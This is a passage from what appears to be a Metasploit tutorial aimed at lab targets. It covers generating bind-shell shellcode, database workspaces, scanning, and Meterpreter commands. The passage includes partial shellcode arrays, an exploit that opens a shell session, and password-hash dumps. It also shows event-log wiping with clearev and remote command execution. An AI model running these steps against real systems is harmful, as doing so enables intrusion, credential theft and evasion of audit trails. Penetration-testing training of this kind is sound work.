 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 ...snip...

::

  msf  payload(shell_bind_tcp) > generate -t c
 /*
  * windows/shell_bind_tcp - 341 bytes
  * http://www.metasploit.com
  * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
  * InitialAutoRunScript=, AutoRunScript=
  */
 unsigned char buf[] =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
 "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
 "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
 ...snip...


::

  msf  payload(shell_bind_tcp) > generate -t java
 /*
  * windows/shell_bind_tcp - 341 bytes
  * http://www.metasploit.com
  * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
  * InitialAutoRunScript=, AutoRunScript=
  */
 byte shell[] = new byte[]
 {
	 (byte) 0xfc, (byte) 0xe8, (byte) 0x89, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x60, (byte) 0x89,
	 (byte) 0xe5, (byte) 0x31, (byte) 0xd2, (byte) 0x64, (byte) 0x8b, (byte) 0x52, (byte) 0x30, (byte) 0x8b,
	 (byte) 0x52, (byte) 0x0c, (byte) 0x8b, (byte) 0x52, (byte) 0x14, (byte) 0x8b, (byte) 0x72, (byte) 0x28,
	 (byte) 0x0f, (byte) 0xb7, (byte) 0x4a, (byte) 0x26, (byte) 0x31, (byte) 0xff, (byte) 0x31, (byte) 0xc0,
	 (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0xc1,
 ...snip...


Looking at the output for the different programming languages, we see that each output adheres to their respective language syntax. A hash ‘#’ is used for comments in Ruby but in C it’s replaced with the slash and asterisk characters ‘/*’ syntax. Looking at all three outputs, the arrays are properly declared for the language format selected. Making it ready to be copy & pasted into your script.

Adding a NOP (No Operation or Next Operation) sled is accomplished with the ‘-s‘ switch followed by the number of NOPs. This will add the sled at the beginning of our payload. Keep in mind the larger the sled the larger the shellcode will be. So adding a 10 NOPs will add 10 bytes to the total size.

::

  msf  payload(shell_bind_tcp) > generate
 # windows/shell_bind_tcp - 341 bytes
 # http://www.metasploit.com
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 ...snip...

::

  msf  payload(shell_bind_tcp) > generate -s 14
 # windows/shell_bind_tcp - 355 bytes
 # http://www.metasploit.com
 # NOP gen: x86/opty2
 # VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
 # InitialAutoRunScript=, AutoRunScript=
 buf =
 "\xb9\xd5\x15\x9f\x90\x04\xf8\x96\x24\x34\x1c\x98\x14\x4a" +
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
 "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
 "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
 ...snip...

The first line of the buf of the second payload text shows us our NOP sled at the payload’s beginning. Comparing the next 3 lines with the shellcode just above, we see they are exactly the same. Total bytes, as expected, grew by exactly 14 bytes.

Metasploit database
--------

Setup
^^^^

In Kali, you will need to start up the postgresql server before using the database.

::

  root@kali:~# systemctl start postgresql


After starting postgresql you need to create and initialize the msf database with msfdb init

::

  root@kali:~# msfdb init
 Creating database user 'msf'
 Enter password for new role:
 Enter it again:
 Creating databases 'msf' and 'msf_test'
 Creating configuration file in /usr/share/metasploit-framework/config/database.yml
 Creating initial database schema


Using Workspaces in Metasploit
^^^^^^^^

When we load up msfconsole, and run ‘db_status‘, we can confirm that Metasploit is successfully connected to the database.

::

  msf > db_status
 [*] postgresql connected to msf


Seeing this capability is a meant to keep track of our activities and scans in order. It’s imperative we start off on the right foot. Once connected to the database, we can start organizing our different movements by using what are called ‘workspaces’. This gives us the ability to save different scans from different locations/networks/subnets for example.

Issuing the ‘workspace‘ command from the msfconsole, will display the currently selected workspaces. The ‘default‘ workspace is selected when connecting to the database, which is represented by the * beside its name.

::

  msf > workspace
 * default
   msfu
   lab1
   lab2
   lab3
   lab4
 msf >


As we can see this can be quite handy when it comes to keeping things ‘neat’. Let’s change the current workspace to ‘msfu’.

::

  msf > workspace msfu
 [*] Workspace: msfu
 msf > workspace
   default
 * msfu
   lab1
   lab2
   lab3
   lab4
 msf >


Creating and deleting a workspace one simply uses the ‘-a‘ or ‘-d‘ followed by the name at the msfconsole prompt.

::

  msf > workspace -a lab4
 [*] Added workspace: lab4
 msf >


 msf > workspace -d lab4
 [*] Deleted workspace: lab4
 msf > workspace


It’s that simple, using the same command and adding the ‘-h‘ switch will provide us with the command’s other capabilities.

::

  msf > workspace -h
 Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information

 msf >

From now on any scan or imports from 3rd party applications will be saved into this workspace.

Now that we are connected to our database and workspace setup, lets look at populating it with some data. First we’ll look at the different ‘db_’ commands available to use using the ‘help’ command from the msfconsole.

::

   msf > help
 ...snip...

 Database Backend Commands
 =========================

    Command           Description
    -------           -----------
    creds             List all credentials in the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces



Importing and Scanning
^^^^^^

There are several ways we can do this, from scanning a host or network directly from the console, or importing a file from an earlier scan. Let’s start by importing an nmap scan of the ‘metasploitable 2’ host. This is done using the ‘db_import‘ followed by the path to our file.

::

  msf >  db_import /root/msfu/nmapScan
 [*] Importing 'Nmap XML' data
 [*] Import: Parsing with 'Rex::Parser::NmapXMLStreamParser'
 [*] Importing host 172.16.194.172
 [*] Successfully imported /root/msfu/nmapScan
 msf > hosts

 Hosts
 =====

 address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------  ---------  -----  -------  ----  --------
 172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server

 msf >


Once completed we can confirm the import by issuing the ‘hosts’ command. This will display all the hosts stored in our current workspace. We can also scan a host directly from the console using the ‘db_nmap’ command. Scan results will be saved in our current database. The command works the same way as the command line version of ‘nmap’


::

  msf > db_nmap -A 172.16.194.134
 [*] Nmap: Starting Nmap 5.51SVN ( http://nmap.org ) at 2012-06-18 12:36 EDT
 [*] Nmap: Nmap scan report for 172.16.194.134
 [*] Nmap: Host is up (0.00031s latency).
 [*] Nmap: Not shown: 994 closed ports
 [*] Nmap: PORT     STATE SERVICE      VERSION
 [*] Nmap: 80/tcp   open  http         Apache httpd 2.2.17 ((Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4

 ...snip...

 [*] Nmap: HOP RTT     ADDRESS
 [*] Nmap: 1   0.31 ms 172.16.194.134
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
 msf >


 msf > hosts

 Hosts
 =====

 address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------            ---------  -----  -------  ----  --------
 172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server
 172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server

 msf >


Backing Up Our Data
^^^^^^

Exporting our data outside the Metasploit environment is very simple. Using the ‘db_export‘ command all our gathered information can be saved in a XML file. This format can be easily used and manipulated later for reporting purposes. The command has 2 outputs, the ‘xml‘ format which will export all of the information currently stored in our active workspace, and the ‘pwdump‘ format which exports everything related to used/gathered credentials.

::

  msf >  db_export -h
 Usage:
    db_export -f  [-a] [filename]
    Format can be one of: xml, pwdump
 [-] No output file was specified

 msf > db_export -f xml /root/msfu/Exported.xml
 [*] Starting export of workspace msfu to /root/msfu/Exported.xml [ xml ]...
 [*]     >> Starting export of report
 [*]     >> Starting export of hosts
 [*]     >> Starting export of events
 [*]     >> Starting export of services
 [*]     >> Starting export of credentials
 [*]     >> Starting export of web sites
 [*]     >> Starting export of web pages
 [*]     >> Starting export of web forms
 [*]     >> Starting export of web vulns
 [*]     >> Finished export of report
 [*] Finished export of workspace msfu to /root/msfu/Exported.xml [ xml ]...


Using the Hosts Command
^^^^^^

Now that we can import and export information to and from our database, let us look at how we can use this information within the msfconsole. Many commands are available to search for specific information stored in our database. Hosts names, address, discovered services etc. We can even use the resulting data to populate module settings such as RHOSTS. We’ll look how this is done a bit later.

The ‘hosts‘ command was used earlier to confirm the presence of data in our database. Let’s look at the different options available and see how we use it to provide us with quick and useful information. Issuing the command with ‘-h’ will display the help menu.

::

  msf > hosts -h
 Usage: hosts [ options ] [addr1 addr2 ...]

 OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o          Send output to a file in csv format
  -O        Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

 Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags


We’ll start by asking the ‘hosts‘ command to display only the IP address and OS type using the ‘-c‘ switch.

::

  msf > hosts -c address,os_flavor

 Hosts
 =====

 address         os_flavor
 -------         ---------
 172.16.194.134  XP
 172.16.194.172  Ubuntu


Setting up Modules
^^^^^^

Another interesting feature available to us, is the ability to search all our entries for something specific. Imagine if we wished to find only the Linux based machines from our scan. For this we’d use the ‘-S‘ option. This option can be combined with our previous example and help fine tune our results.

::

  msf > hosts -c address,os_flavor -S Linux

 Hosts
 =====

 address         os_flavor
 -------         ---------
 172.16.194.172  Ubuntu

 msf >


Using the output of our previous example, we’ll feed that into the ‘tcp’ scan auxiliary module.

::

  msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string for capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


We can see by default, nothing is set in ‘RHOSTS‘, we’ll add the ‘-R‘ switch to the hosts command and run the module. Hopefully it will run and scan our target without any problems.

::

  msf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R

 Hosts
 =====

 address         os_flavor
 -------         ---------
 172.16.194.172  Ubuntu

 RHOSTS => 172.16.194.172

 msf  auxiliary(tcp) > run

 [*] 172.16.194.172:25 - TCP OPEN
 [*] 172.16.194.172:23 - TCP OPEN
 [*] 172.16.194.172:22 - TCP OPEN
 [*] 172.16.194.172:21 - TCP OPEN
 [*] 172.16.194.172:53 - TCP OPEN
 [*] 172.16.194.172:80 - TCP OPEN

 ...snip...

 [*] 172.16.194.172:5432 - TCP OPEN
 [*] 172.16.194.172:5900 - TCP OPEN
 [*] 172.16.194.172:6000 - TCP OPEN
 [*] 172.16.194.172:6667 - TCP OPEN
 [*] 172.16.194.172:6697 - TCP OPEN
 [*] 172.16.194.172:8009 - TCP OPEN
 [*] 172.16.194.172:8180 - TCP OPEN
 [*] 172.16.194.172:8787 - TCP OPEN
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed


Of course this also works if our results contain more than one address.

::

  msf  auxiliary(tcp) > hosts -R

 Hosts
 =====

 address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------            ---------  -----  -------  ----  --------
 172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server
 172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server

 RHOSTS => 172.16.194.134 172.16.194.172

 msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting                Required  Description
   ----         ---------------                --------  -----------
   CONCURRENCY  10                             yes       The number of concurrent ports to check per host
   FILTER                                      no        The filter string for capturing traffic
   INTERFACE                                   no        The name of the interface
   PCAPFILE                                    no        The name of the PCAP capture file to process
   PORTS        1-10000                        yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       172.16.194.134 172.16.194.172  yes       The target address range or CIDR identifier
   SNAPLEN      65535                          yes       The number of bytes to capture
   THREADS      1                              yes       The number of concurrent threads
   TIMEOUT      1000                           yes       The socket connect timeout in milliseconds


You can see how useful this may be if our database contained hundreds of entries. We could search for Windows machines only, then set the RHOSTS option for the smb_version auxiliary module very quickly. The set RHOSTS switch is available in almost all of the commands that interact with the database.


Services
^^^^

Another way to search the database is by using the ‘services‘ command. Like the previous examples, we can extract very specific information with little effort.

::

 msf > services -h

 Usage: services [-h] [-u] [-a] [-r ] [-p >port1,port2>] [-s >name1,name2>] [-o ] [addr1 addr2 ...]

 -a,--add          Add the services instead of searching
 -d,--delete       Delete the services instead of searching
 -c <col1,col2>    Only show the given columns
 -h,--help         Show this help information
 -s <name1,name2>  Search for a list of service names
 -p <port1,port2>  Search for a list of ports
 -r      Only show [tcp|udp] services
 -u,--up           Only show services which are up
 -o          Send output to a file in csv format
 -R,--rhosts       Set RHOSTS from the results of the search
 -S,--search       Search string to filter by

 Available columns: created_at, info, name, port, proto, state, updated_at


Much in the same way as the hosts command, we can specify which fields to be displayed. Coupled with the ‘-S‘ switch, we can also search for a service containing a particular string.

::

  msf > services -c name,info 172.16.194.134

 Services
 ========

 host            name          info
 ----            ----          ----
 172.16.194.134  http          Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134  msrpc         Microsoft Windows RPC
 172.16.194.134  netbios-ssn
 172.16.194.134  http          Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134  microsoft-ds  Microsoft Windows XP microsoft-ds
 172.16.194.134  mysql


Here we are searching all hosts contained in our database with a service name containing the string ‘http’.

::

  msf > services -c name,info -S http

 Services
 ========

 host            name  info
 ----            ----  ----
 172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.172  http  Apache httpd 2.2.8 (Ubuntu) DAV/2
 172.16.194.172  http  Apache Tomcat/Coyote JSP engine 1.1

The combinations for searching are enormous. We can use specific ports, or port ranges. Full or partial service name when using the ‘-s’ or ‘-S’ switches. For all hosts or just a select few… The list goes on and on. Here are a few examples, but you may need to experiment with these features in order to get what you want and need out your searches.


::

  msf > services -c info,name -p 445

 Services
 ========

 host            info                                  name
 ----            ----                                  ----
 172.16.194.134  Microsoft Windows XP microsoft-ds     microsoft-ds
 172.16.194.172  Samba smbd 3.X workgroup: WORKGROUP   netbios-ssn


::

  msf > services -c port,proto,state -p 70-81
 Services
 ========
 host           port proto state
 ----           ---- ----- -----
 172.16.194.134 80   tcp   open
 172.16.194.172 75   tcp   closed
 172.16.194.172 71   tcp   closed
 172.16.194.172 72   tcp   closed
 172.16.194.172 73   tcp   closed
 172.16.194.172 74   tcp   closed
 172.16.194.172 70   tcp   closed
 172.16.194.172 76   tcp   closed
 172.16.194.172 77   tcp   closed
 172.16.194.172 78   tcp   closed
 172.16.194.172 79   tcp   closed
 172.16.194.172 80   tcp   open
 172.16.194.172 81   tcp  closed


::

  msf > services -s http -c port 172.16.194.134
 Services
 ========
 host           port
 ----           ----
 172.16.194.134 80
 172.16.194.134 443


::

  msf > services -S Unr
 Services
 ========
 host           port proto name state info
 ----           ---- ----- ---- ----- ----
 172.16.194.172 6667 tcp   irc  open  Unreal ircd
 172.16.194.172 6697 tcp   irc  open  Unreal ircd


CSV Export
^^^^^^

Both the hosts and services commands give us a means of saving our query results into a file. The file format is a comma separated value, or CSV. Followed by the ‘-o’ with path and filename, the information that has been displayed on the screen at this point will now be saved to disk.


::

  msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv

 [*] Wrote services to /root/msfu/http.csv

 msf > hosts -S Linux -o /root/msfu/linux.csv
 [*] Wrote hosts to /root/msfu/linux.csv

 msf > cat /root/msfu/linux.csv
 [*] exec: cat /root/msfu/linux.csv

 address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
 "172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""

 msf > cat /root/msfu/http.csv
 [*] exec: cat /root/msfu/http.csv

 host,port
 "172.16.194.134","80"
 "172.16.194.134","443"


Creds
^^^^

The ‘creds’ command is used to manage found and used credentials for targets in our database. Running this command without any options will display currently saved credentials.


::

  msf > creds

 Credentials
 ===========

 host  port  user  pass  type  active?
 ----  ----  ----  ----  ----  -------

 [*] Found 0 credentials.


As with ‘db_nmap‘ command, successful results relating to credentials will be automatically saved to our active workspace. Let’s run the auxiliary module ‘mysql_login‘ and see what happens when Metasploit scans our server.


::

  msf  auxiliary(mysql_login) > run

 [*] 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
 [*] 172.16.194.172:3306 MYSQL - [1/2] - Trying username:'root' with password:''
 [*] 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed


 msf  auxiliary(mysql_login) > creds

 Credentials
 ===========

 host            port  user  pass  type      active?
 ----            ----  ----  ----  ----      -------
 172.16.194.172  3306  root        password  true

 [*] Found 1 credential.
 msf  auxiliary(mysql_login) >


We can see the module was able to connect to our mysql server, and because of this Metasploit saved the credentials in our database automatically for future reference.

During post-exploitation of a host, gathering user credentials is an important activity in order to further penetrate a target network. As we gather sets of credentials, we can add them to our database with the ‘creds -a’ command.

::

  msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
 [*] Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto=tcp sname= type=password user=Administrator pass=7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active=true

 msf > creds

 Credentials
 ===========

 host            port  user           pass                                                                  type      active?
 ----            ----  ----           ----                                                                  ----      -------
 172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  password  true

 [*] Found 1 credential.


Loot
^^^^

Once you’ve compromised a system (or three), one of the objective may be to retrieve hash dumps. From either a Windows or *nix system. In the event of a successful hash dump, this information will be stored in our database. We can view this dumps using the ‘loot’ command. As with almost every command, adding the ‘-h’ switch will display a little more information.

::

  msf > loot -h
 Usage: loot
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by


Here’s an example of how one would populate the database with some ‘loot’.

::

  msf  exploit(usermap_script) > exploit

 [*] Started reverse double handler
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo 4uGPYOrars5OojdL;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: "4uGPYOrars5OojdL\r\n"
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:55138) at 2012-06-27 19:38:54 -0400

 ^Z
 Background session 1? [y/N]  y

 msf  exploit(usermap_script) > use post/linux/gather/hashdump
 msf  post(hashdump) > show options

 Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

 msf  post(hashdump) > sessions -l

 Active sessions
 ===============

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 (172.16.194.172)

 msf  post(hashdump) > run

 [+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
 [+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
 [+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
 [+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
 [+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 [+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
 [+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
 [+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
 [*] Post module execution completed



 msf  post(hashdump) > loot

 Loot
 ====

 host            service  type          name                   content     info                            path
 ----            -------  ----          ----                   -------     ----                            ----
 172.16.194.172           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
 172.16.194.172           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
 172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt


Meterpreter
-------

Since the Meterpreter provides a whole new environment, we will cover some of the basic Meterpreter commands to get you started and help familiarize you with this most powerful tool. Throughout this course, almost every available Meterpreter command is covered. For those that aren’t covered, experimentation is the key to successful learning.

help
^^^^

The ‘help‘ command, as may be expected, displays the Meterpreter help menu.

::

  meterpreter > help

 Core Commands
 =============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    channel       Displays information about active channels
 ...snip...


background
^^^^^^

The ‘background‘ command will send the current Meterpreter session to the background and return you to the msf prompt. To get back to your Meterpreter session, just interact with it again.

::

  meterpreter > background
 msf exploit(ms08_067_netapi) > sessions -i 1
 [*] Starting interaction with 1...

 meterpreter >


cat
^^^^

The ‘cat‘ command is identical to the command found on *nix systems. It displays the content of a file when it’s given as an argument.

::

  meterpreter > cat
 Usage: cat file

 Example usage:
 meterpreter > cat edit.txt
 What you talkin' about Willis

 meterpreter >

cd > pwd
^^^^^^

The ‘cd‘ > ‘pwd‘ commands are used to change and display current working directly on the target host.
The change directory “cd” works the same way as it does under DOS and \*nix systems.
By default, the current working folder is where the connection to your listener was initiated.

::

  meterpreter > pwd
 c:\
 meterpreter > cd c:\windows
 meterpreter > pwd
 c:\windows
 meterpreter >


clearev
^^^^

The ‘clearev‘ command will clear the Application, System, and Security logs on a Windows system. There are no options or arguments.


::

  meterpreter > clearev
 [*] Wiping 97 records from Application...
 [*] Wiping 415 records from System...
 [*] Wiping 0 records from Security...
 meterpreter >

download
^^^^

The ‘download‘ command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.

::

  meterpreter > download c:\\boot.ini
 [*] downloading: c:\boot.ini -> c:\boot.ini
 [*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
 meterpreter >


edit
^^^^

The ‘edit‘ command opens a file located on the target host.
It uses the ‘vim’ so all the editor’s commands are available.

::

  meterpreter > ls

 Listing: C:\Documents and Settings\Administrator\Desktop
 ========================================================

 Mode              Size    Type  Last modified              Name
 ----              ----    ----  -------------              ----
 .
 ...snip...
 .
 100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt

 meterpreter > edit edit.txt


execute
^^^^

The ‘execute‘ command runs a command on the target.

::

  meterpreter > execute -f cmd.exe -i -H
 Process 38320 created.
 Channel 1 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 C:\WINDOWS\system32>

getuid
^^^^^^

Running ‘getuid‘ will display the user that the Meterpreter server is running as on the host.

::

  meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >


hashdump
^^^^^^

The ‘hashdump‘ post module will dump the contents of the SAM database.

::

  meterpreter > run post/windows/gather/hashdump

 [*] Obtaining the boot key...
 [*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
 [*] Obtaining the user list and keys...
 [*] Decrypting user keys...
 [*] Dumping password hashes...

 Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
 dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
 SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
 victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
 meterpreter >


idletime
^^^^^^

Running ‘idletime‘ will display the number of seconds that the user at the remote machine has been idle.

::

  meterpreter > idletime
 User has been idle for: 5 hours 26 mins 35 secs
 meterpreter >


ipconfig
^^^^^^

The ‘ipconfig‘ command displays the network interfaces and addresses on the remote machine.

::

  meterpreter > ipconfig

 MS TCP Loopback interface
 Hardware MAC: 00:00:00:00:00:00
 IP Address  : 127.0.0.1
 Netmask     : 255.0.0.0

 AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
 Hardware MAC: 00:0c:29:10:f5:15
 IP Address  : 192.168.1.104
 Netmask     : 255.255.0.0

 meterpreter >


lpwd > lcd
^^^^^^

The ‘lpwd‘ > ‘lcd‘ commands are used to display and change the local working directory respectively.
When receiving a Meterpreter shell, the local working directory is the location where one started the Metasploit console.

Changing the working directory will give your Meterpreter session access to files located in this folder.

::

  meterpreter > lpwd
 /root

 meterpreter > lcd MSFU
 meterpreter > lpwd
 /root/MSFU

 meterpreter > lcd /var/www
 meterpreter > lpwd
 /var/www
 meterpreter >


ls
^^^^

As in Linux, the ‘ls‘ command will list the files in the current remote directory.


::

  meterpreter > ls

 Listing: C:\Documents and Settings\victim
 =========================================

 Mode              Size     Type  Last modified                   Name
 ----              ----     ----  -------------                   ----
 40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
 40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
 100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
 40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
 ...snip...


migrate
^^^^^^

Using the ‘migrate‘ post module, you can migrate to another process on the victim.

::

  meterpreter > run post/windows/manage/migrate

 [*] Running module against V-MAC-XP
 [*] Current server process: svchost.exe (1076)
 [*] Migrating to explorer.exe...
 [*] Migrating into process ID 816
 [*] New server process: Explorer.EXE (816)
 meterpreter >


ps
^^^^

The ‘ps‘ command displays a list of running processes on the target.


::

  meterpreter > ps

 Process list
 ============

    PID   Name                  Path
    ---   ----                  ----
    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
